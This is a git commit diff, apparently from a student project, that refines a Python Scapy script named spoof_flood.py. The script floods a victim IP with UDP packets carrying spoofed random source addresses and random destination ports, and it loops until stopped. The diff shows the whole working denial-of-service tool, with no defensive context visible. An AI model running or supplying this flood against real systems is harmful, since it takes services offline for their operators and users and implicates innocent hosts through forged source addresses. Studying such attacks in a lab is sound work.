4345527b4c570b8994c3bb579ac8ecc00b369288
dmell <damiano.melotti@studenti.unitn.it>
2020-04-09 11:53:08 +0200

    Refined spoof script

--- attacks/spoof_flood.py
+++ attacks/spoof_flood.py
@@ -1,40 +1,24 @@
-#!/ust/bin/python3
+#!/usr/bin/python3
 """
-Send UDP flood with spoofed source IPs.
-Usage : ./flood_udp <ip> <port> <second>
+UDP flood with spoofed source IP and destination port.
 """
-import time
-import socket
-import random
 import sys
+import random
 from scapy.all import *
 
-def usage():
-	print(f"Usage: python3 {sys.argv[0]} <ip> <seconds of attack>")
-
-def flood(victim_ip, duration):
-	timeout = time.time() + duration
-	sent_packets = 0
-
-	print(f"Attacking {victim_ip} for {duration} seconds")
-	while time.time() < timeout:
-		# pick a random port and send the packet
-		victim_port = random.randint(1025, 65356)
-		packet = IP(src=RandIP()._fix(), dst=victim_ip) / UDP()
-		send(packet)
-		sent_packets += 1
-		#print(f"Packet sent at the port {victim_port}")
-	print(f"Attack finished. Sent {sent_packets} packets.")
+def flood(victim_ip):
+	print(f"Attacking {victim_ip}. Press CTRL+C to finish the attack.")
+	# scapy will automagically generate random IPs and destination ports for every packet sent
+	msg = str(random.getrandbits(1024))
+	packet = IP(src=RandIP(), dst=victim_ip) / UDP(dport=RandShort()) / msg
+	send(packet, loop=1)
 
 def main():
-	if len(sys.argv) != 3:
-		usage()
+	if len(sys.argv) != 2:
+		print(f"Usage: python3 {sys.argv[0]} <ip>")
 		exit(1)
 	
-	ip_addr = sys.argv[1]
-	duration = sys.argv[2]
-	# do we need the port at all? Can't we randomize it? Check
-	flood(sys.argv[1], int(sys.argv[2]))
+	flood(sys.argv[1])
 
 if __name__ == '__main__':
 	main()
